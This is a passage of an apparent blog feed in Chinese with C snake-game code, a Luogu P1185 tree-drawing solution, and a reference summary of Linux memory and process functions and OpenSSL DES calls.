class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="吃到苹果的处理">吃到苹果的处理</h3><p>要进行胜负判断苹果的重新生成和打印</p><h4 id="关键代码">关键代码:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 进行下一个苹果的生成(随机)</span></span><br><span class="line">srand((<span class="type">unsigned</span> <span class="type">int</span>) time(<span class="literal">NULL</span>));</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    apple.x = ((rand() % (WIDTH - <span class="number">2</span>)) + <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">    apple.y = (rand() % (HEIGHT - <span class="number">2</span>)) + <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (isOverlap()); <span class="comment">// 直到苹果生成在正确的(没有生成在蛇身体上---需要对蛇的链表进行遍历)位置</span></span><br><span class="line">gotoxy(apple.x, apple.y); <span class="comment">// 跳转到该坐标并进行打印苹果</span></span><br><span class="line">color(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);</span><br><span class="line">score++; <span class="comment">// 分数+1</span></span><br></pre></td></tr></table></figure><h4 id="判断坐标是否正确-isoverlap-函数">判断坐标是否正确—isOverlap()函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isOverlap</span><span class="params">()</span> &#123;<span class="comment">// 检查新生成的苹果坐标是否和蛇身的任何一个部位重合</span></span><br><span class="line">    snake *temp = head;</span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123;<span class="comment">// 遍历蛇身链表</span></span><br><span class="line">        <span class="keyword">if</span> (apple.x == temp-&gt;x &amp;&amp; apple.y == temp-&gt;y)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="胜负判断-是否撞墙或是否撞到自己">胜负判断—是否撞墙或是否撞到自己</h3><h4 id="是否撞墙-againstthewall-函数">是否撞墙—againstTheWall()函数</h4><p>只需要判断蛇头的坐标是否和边界重合</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">againstTheWall</span><span class="params">()</span> &#123;<span class="comment">//检查撞墙即检查蛇头的坐标是否和墙壁的坐标重合</span></span><br><span class="line">    <span class="keyword">if</span> (head-&gt;x == <span class="number">0</span> || head-&gt;x == WIDTH * <span class="number">2</span> - <span class="number">2</span> ||</span><br><span class="line">        head-&gt;y == <span class="number">0</span> || head-&gt;y == HEIGHT - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="是否撞到自己-againstthewall-函数">是否撞到自己—againstTheWall()函数</h4><p>此时需要遍历整个链表(除了蛇头)来和蛇头的坐标进行比较</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">againstSelf</span><span class="params">()</span> &#123; <span class="comment">// 检查撞到自己即检查蛇头的坐标是否和任一蛇身的坐标重合</span></span><br><span class="line">    snake *temp = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123; <span class="comment">// 对链表进行遍历</span></span><br><span class="line">        <span class="keyword">if</span> (head-&gt;x == temp-&gt;x &amp;&amp; head-&gt;y == temp-&gt;y)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        temp = temp-&gt;next; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="销毁数据-destorygamedata-函数">销毁数据—destoryGameData()函数</h3><p>每局游戏需要进行数据的销毁(链表)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">destoryGameData</span><span class="params">()</span> &#123;<span class="comment">//主要任务即销毁链表</span></span><br><span class="line">    snake *temp = head;</span><br><span class="line">    snake *next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123;<span class="comment">//遍历蛇身链表</span></span><br><span class="line">        next = temp-&gt;next;<span class="comment">//蛇最短也有4个结点,不存在temp和temp-&gt;next为NULL的情况</span></span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">        temp = next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C C++ programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> console </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷P1185-绘制二叉树</title>
      <link href="/2023aadde2dc75cb/"/>
      <url>/2023aadde2dc75cb/</url>
      
        <content type="html"><![CDATA[<p>首先先说一下最后一个测试点很多人RE的问题,我来了一张图:<br><img src="https://cdn.luogu.com.cn/upload/image_hosting/j76jqa31.png" alt=""><br>大概就是图里的那样…</p><p>下面是我的思路:<br>可能<s>稍微</s>复杂一点…</p><p>首先,题意我就不说了,关键在于每一层的边长度不同:<br>大佬们已经推出来这么个东西:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f[<span class="number">20</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">23</span>,<span class="number">47</span>,<span class="number">95</span>,<span class="number">191</span>,<span class="number">383</span>,<span class="number">767</span>&#125;;</span><br></pre></td></tr></table></figure><p>其中f[i]就是高度为i的那一层到它上一层的边的长度(这里的高度指的是由下往上数的高度,为了方便我把最下边设为了1)<br>举个例子(样例)<img src="https://cdn.luogu.com.cn/upload/image_hosting/4ll725uh.png" alt="">:<br>也就是说f[i]存的就是第i层到第i-1层的边的长度(几个’/‘或’\’)</p><p>我是先把最下边一层先初始化弄进去,因为我不知道n,所以我从我开的画布数组最下边一行开始,从下往上:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">num=<span class="number">1</span>&lt;&lt;(n<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">1</span>,j=<span class="number">1</span>;i&lt;=num/<span class="number">2</span>;++i,j+=<span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">paint[<span class="number">19000</span>][j]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">paint[<span class="number">19000</span>][j+<span class="number">4</span>]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个一组,很容易得出最下面一行共需要(2^(n-1))/2次循环,每次直接两个都放进去’o’,然后很容易的j每次加6(横坐标)</p><p>然后从倒数第二行开始模拟往画布里填’o’或’/‘或’\’<br>我们可以这样:计算出当前行的最左/最右结点在画布里的坐标为循环边界,从左边(当前行的所有结点视为向上一行的结点的孩子),即左孩子开始,向右上方朝父节点画’/’.</p><p>但是要画几次呢?这时我们的f[]数组就派上用场了…从第i层向上画’/'当然画f[i]次了,然后画完边后再向右上一格把父节点也就是’o’画上,然后从父结点再往右下画回到右孩子,然后这一个子树画完再画旁边的树,画个流程图吧:<img src="https://cdn.luogu.com.cn/upload/image_hosting/ghvps2ft.png" alt=""></p><p>就是这样,先上去,再下来,然后虚线跳到下一个子树,注意这时跳跃的长度每层是不一样的,我们用s[]来存,很容易得出(跟f[]很类似):</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s[<span class="number">20</span>]=&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">48</span>,<span class="number">96</span>,<span class="number">192</span>,<span class="number">384</span>,<span class="number">768</span>,<span class="number">1536</span>&#125;;</span><br></pre></td></tr></table></figure><p>每次横坐标加就行了</p><p>这样,我们最后就有了一个完全二叉树,然后就是去节点了.<br>画布里存得是点或边在这张&quot;画&quot;里得坐标,而题目输入进来得是结点在树中得坐标,这时我们就开一个结构体数组存树,数组的每个元素为结点,每个元素(都是一个结构体变量)里的结构体成员x和y存的是通过计算求得的在画布里的坐标,然后找到要删除的点,把它和它的子树所在的一个正方形区都归为’ '(空格),如图:<img src="https://cdn.luogu.com.cn/upload/image_hosting/n0l0wfis.png" alt=""></p><p>然后,愉快的输出就行了,其他的细节在代码中:</p><p>AC代码:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> n,k,num,x,y,line=<span class="number">19000</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> l,r,f[<span class="number">20</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">23</span>,<span class="number">47</span>,<span class="number">95</span>,<span class="number">191</span>,<span class="number">383</span>,<span class="number">767</span>&#125;;<span class="comment">//解释过了</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> s[<span class="number">20</span>]=&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">48</span>,<span class="number">96</span>,<span class="number">192</span>,<span class="number">384</span>,<span class="number">768</span>,<span class="number">1536</span>&#125;;<span class="comment">//跳跃的长度</span></span><br><span class="line"><span class="type">char</span> paint[<span class="number">20001</span>][<span class="number">5000</span>];<span class="comment">//画布</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TREE</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> x,y;</span><br><span class="line">&#125;tree[<span class="number">1040</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">draw</span><span class="params">(<span class="type">long</span> <span class="type">long</span> i)</span><span class="comment">//画边和点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">x=line,y=l;</span><br><span class="line">l=y+f[i]+<span class="number">1</span>;<span class="comment">//l---左边界的重新计算要在这里</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> j=<span class="number">1</span>;j&lt;=num/<span class="number">2</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/////////向右上画//////////////</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> k=<span class="number">1</span>;k&lt;=f[i];++k)</span><br><span class="line">paint[--x][++y]=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">paint[--x][++y]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line"><span class="comment">//////////////////////////////</span></span><br><span class="line"><span class="comment">/////////向右下画回去//////////</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> k=<span class="number">1</span>;k&lt;=f[i];++k)</span><br><span class="line">paint[++x][++y]=<span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line"><span class="comment">//////////////////////////////</span></span><br><span class="line">++x;</span><br><span class="line">y++;</span><br><span class="line">y+=s[i];</span><br><span class="line"><span class="comment">//重新计算坐标</span></span><br><span class="line">&#125;</span><br><span class="line">y-=s[i];</span><br><span class="line">r=y-f[i]<span class="number">-1</span>;</span><br><span class="line">line=x-f[i]<span class="number">-1</span>;</span><br><span class="line">num/=<span class="number">2</span>;</span><br><span class="line"><span class="comment">//把num---即当前行的结点数、</span></span><br><span class="line"><span class="comment">//r---右边界、</span></span><br><span class="line"><span class="comment">//line---最高点的所在行</span></span><br><span class="line"><span class="comment">//重新计算为向上一行(左边界在上边重新计算)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove_down_all</span><span class="params">(<span class="type">long</span> <span class="type">long</span> up,<span class="type">long</span> <span class="type">long</span> r_l,<span class="type">long</span> <span class="type">long</span> r_r)</span><span class="comment">//重置矩形区域</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=up;i&lt;=<span class="number">19000</span>;++i)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> j=r_l;j&lt;=r_r;++j)</span><br><span class="line">paint[i][j]=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove_up_edge</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x,<span class="type">long</span> <span class="type">long</span> y)</span><span class="comment">//删除(重置为&#x27; &#x27;(即空格))要删除点向上与父亲的连线</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> ex=x<span class="number">-1</span>,ey=y<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(paint[ex][ey]!=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(paint[ex][ey]!=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">paint[ex--][ey--]=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">ex=x<span class="number">-1</span>,ey=y+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(paint[ex][ey]!=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(paint[ex][ey]!=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">paint[ex--][ey++]=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(paint,<span class="string">&#x27; &#x27;</span>,<span class="built_in">sizeof</span>(paint));</span><br><span class="line">num=<span class="number">1</span>&lt;&lt;(n<span class="number">-1</span>);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> num2=num;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> len=<span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> to=(num2/<span class="number">2</span>)*<span class="number">6</span><span class="number">-1</span>;<span class="comment">//to为整棵树的宽度,我们要用它输出树(列循环范围)</span></span><br><span class="line">l=<span class="number">1</span>;r=(num/<span class="number">2</span>)*<span class="number">6</span><span class="number">-1</span>;<span class="comment">//初始化左右边界</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">1</span>,j=<span class="number">1</span>;i&lt;=num/<span class="number">2</span>;++i,j+=<span class="number">6</span>)<span class="comment">//初始化最下面一行</span></span><br><span class="line">&#123;</span><br><span class="line">paint[<span class="number">19000</span>][j]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">paint[<span class="number">19000</span>][j+<span class="number">4</span>]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">1</span>;i&lt;n;++i)<span class="comment">//开始从下往上每一层&quot;绘画&quot;</span></span><br><span class="line"><span class="built_in">draw</span>(i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=line;i&lt;=<span class="number">19000</span>;++i)<span class="comment">//计算坐标,用以删除结点</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> j=<span class="number">1</span>;j&lt;=to;++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(paint[i][j]==<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">tree[++len].x=i;</span><br><span class="line">tree[len].y=j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> t,y1,y2;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">1</span>;i&lt;=k;++i)<span class="comment">//删除结点(每次删除之前的准备工作)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">t=<span class="number">1</span>&lt;&lt;(x<span class="number">-1</span>);</span><br><span class="line">t=t+y<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(t&gt;len)<span class="keyword">continue</span>;</span><br><span class="line">x=tree[t].x;</span><br><span class="line">y=tree[t].y;</span><br><span class="line">y1=y-(<span class="number">19000</span>-x);</span><br><span class="line">y2=y+(<span class="number">19000</span>-x);</span><br><span class="line"></span><br><span class="line"><span class="built_in">remove_down_all</span>(x,y1,y2);</span><br><span class="line"><span class="built_in">remove_up_edge</span>(x,y);<span class="comment">//这两个函数才是真正的删除</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理完了......</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=line;i&lt;=<span class="number">19000</span>;++i)<span class="comment">//输出,结束</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> j=<span class="number">1</span>;j&lt;=to;++j)</span><br><span class="line">cout&lt;&lt;paint[i][j];</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>管理员求过…真的是自己的做法</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 模拟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c系函数总结</title>
      <link href="/2023fbefc4f390e2/"/>
      <url>/2023fbefc4f390e2/</url>
      
        <content type="html"><![CDATA[<h1 id="linux-c函数">Linux c函数</h1><h2 id="内存控制">内存控制</h2><h3 id="mprotect函数">mprotect函数</h3><p>常用于<code>SMC技术</code>.</p><p>用于更改一段内存的保护属性,例如将可读写的内存区域变为只读，或者将只读的内存区域变为可执行等.</p><p>pwn中常用于修改.bss段的属性以此来绕过<strong>NX保护</strong>.</p><p>函数原型:</p><p><code>int mprotect(void *addr, size_t len, int prot);</code></p><p>参数说明：</p><ul><li><code>addr</code>：要更改保护属性的内存区域的起始地址。</li><li><code>len</code>：内存区域的长度（以字节为单位）。</li><li><code>prot</code>：新的保护权限，可以是 <code>PROT_NONE</code>、<code>PROT_READ</code>、<code>PROT_WRITE</code>、<code>PROT_EXEC</code> 等的组合。</li></ul><p><code>mprotect</code> 函数返回 0 表示成功，返回 -1 表示失败，并设置相应的错误码。</p><h3 id="mmap函数">mmap函数</h3><p>用于内存映射,可以用于简化例如进程间通信—IPC需要4次数据复制,而内存映射到共享区只需2次复制即可</p><p>函数原型:</p><p><code>void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);</code></p><p>参数说明：</p><ul><li><code>addr</code>：映射的起始地址，通常为 <code>NULL</code>，由系统自动分配。</li><li><code>length</code>：映射区域的大小，以字节为单位。</li><li><code>prot</code>：映射区域的保护权限，可以是 <code>PROT_READ</code>、<code>PROT_WRITE</code>、<code>PROT_EXEC</code> 等的组合。</li><li><code>flags</code>：映射选项，如 <code>MAP_SHARED</code>、<code>MAP_PRIVATE</code> 等。</li><li><code>fd</code>：文件描述符，表示要映射的文件或设备。</li><li><code>offset</code>：映射的偏移量，表示从文件的哪个位置开始映射。</li></ul><p><code>mmap</code> 返回一个指向映射区域的指针，如果映射失败，则返回 <code>MAP_FAILED</code>。</p><h3 id="read函数">read函数</h3><p>用于读取文件—linux一切皆文件,从打开的文件描述符中读取</p><p>函数原型:</p><p><code>ssize_t read(int fd, void *buf, size_t count);</code></p><p>参数为:</p><p>​文件描述符,读入到的缓冲区,读取的字节数</p><h3 id="write函数">write函数</h3><p>用于读取文件—linux一切皆文件,从打开的文件描述符中写入</p><p>函数原型:</p><p><code>ssize_t write(int fd, const void *buf, size_t count);</code></p><p>参数为:</p><p>​文件描述符,制定从哪个缓冲区用于写入,写入的字节数</p><h2 id="进程控制">进程控制</h2><h3 id="prctl函数">prctl函数</h3><p><code>int prctl(int option,unsigned long arg2,unsigned long arg3,unsigned long arg4,unsigned long arg5)</code></p><p>prctl()是一个系统调用函数,用于为进程指定不同的选项和参数,其选项取决于参数<code>option</code>.</p><h3 id="ptrace函数">ptrace函数</h3><p>即<code>process trace</code>,顾名思义,该函数可以提供追踪进程执行状态的功能。根据官方手册的介绍：<code>ptrace()</code>系统调用为一个进程提供了<strong>观察</strong>和<strong>控制</strong>另一个进程的执行过程的能力，同时也提供<strong>检查</strong>和<strong>改变</strong>另一个进程的内存值以及相关注册信息。其中，被控制的进程被称为<code>tracee</code>，控制进程被称为<code>tracer</code>.</p><p>因此<code>gdb</code>,<code>strace</code>等工具都是基于ptrace系统调用来实现的.</p><p>函数签名:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span>       </span></span><br><span class="line"><span class="type">long</span> <span class="title function_">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="type">pid_t</span> pid, <span class="type">void</span> *addr, <span class="type">void</span> *data)</span>;</span><br></pre></td></tr></table></figure><ul><li>request：要执行的操作类型；</li><li>pid：被追踪的目标进程ID；</li><li>addr：被监控的目标内存地址；</li><li>data：保存读取出或者要写入的数据.</li></ul><p>Linux的<code>T</code>进程状态,即<code>Stopped or Traced</code>,<code>Traced</code>类型是由trace系统调用提供的一个进程状态.</p><h4 id="stopped状态">Stopped状态</h4><p>例如可以在输入时用<code>ctrl+z</code>组合键来中止输入操作,让该进程变成中止状态.</p><p>再次使用fg命令即可恢复进程状态.</p><h4 id="traced状态">Traced状态</h4><p>通过ptrace系统调用可以让进程进入<code>Trace</code>状态,有2种方法:</p><ol><li>tracee进程调用<code>ptrace</code>系统调用,<code>request</code>参数传递<code>PTRACE_TRACEME</code>值,表示想要被tracer进程追踪.通过这种方式的进程想要进入<code>Traced</code>状态有两种方式：<ol><li>主动调用<code>exec</code>系列的系统调用;</li><li><code>tracer</code>发送进入<code>Traced</code>状态的相关信号.</li></ol></li><li>racecer进程调用<code>ptrace</code>系统调用，<code>request</code>参数传递<code>PTRACE_ATTACH</code>这个值,并给出<code>tracee</code>进程的<code>pid</code>,从而让<code>tracee</code>进程进入<code>Traced</code>状态.</li></ol><h1 id="openssl">OpenSSL</h1><h2 id="dec相关">DEC相关</h2><h3 id="des-string-to-key-函数">DES_string_to_key()函数</h3><p>用于将字符串转换为 DES 密钥,函数原型为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">DES_string_to_key</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, DES_cblock *key)</span>;</span><br></pre></td></tr></table></figure><ul><li>str是包含 8 个字符的字符串</li><li>key用于存储生成的密钥的 <code>DES_cblock</code> 结构</li></ul><h3 id="des-set-key-checked-函数">DES_set_key_checked()函数</h3><p>用于设置 DES 密钥并检查密钥的奇偶校验位,函数原型为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">DES_set_key_checked</span><span class="params">(const_DES_cblock *key, DES_key_schedule *schedule)</span>;</span><br></pre></td></tr></table></figure><p>其目的是设置 DES 密钥并检查奇偶校验.</p><p><code>key</code> 是输入的密钥,是一个8字节的DES密钥块.<code>schedule</code> 是输出参数,是一个<code>DES_key_schedule</code>结构,用于保存生成的密钥.</p><h3 id="des-ncbc-encrypt-函数">DES_ncbc_encrypt()函数</h3><p>用于 Cipher Block Chaining (CBC) 模式的 DES 加密,函数原型如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DES_ncbc_encrypt</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *input, <span class="type">unsigned</span> <span class="type">char</span> *output, <span class="type">long</span> length,DES_key_schedule *schedule, DES_cblock *ivec, <span class="type">int</span> encrypt)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>schedule</code>为DES密钥的调度数组.</li><li><code>ivec</code>是初始化向量iv.</li><li><code>encrypt</code>一个整数,非零为加密,零为解密.</li></ul>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> functions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制作业第三周</title>
      <link href="/2023e0bfe3100dcf/"/>
      <url>/2023e0bfe3100dcf/</url>
      
